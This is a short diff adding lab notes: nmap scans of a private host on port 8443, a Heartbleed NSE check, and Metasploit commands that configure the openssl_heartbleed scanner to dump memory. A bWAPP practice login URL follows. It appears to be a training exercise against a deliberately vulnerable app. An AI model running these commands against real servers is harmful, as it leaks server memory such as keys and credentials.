@@ -1,0 +1,15 @@
+nmap -sS 192.168.204.130 -p 8443 -sV
+
+nmap -sS 192.168.204.130 -p 8443 -sV --script ssl-heartbleed
+
+msfconsole -q
+use auxiliary/scanner/ssl/openssl_heartbleed
+show actions
+set ACTION DUMP
+show options
+set RHOSTS 192.168.204.130
+set RPORT 8443
+run
+
+
+https://192.168.204.130:8443/bWAPP/login.php
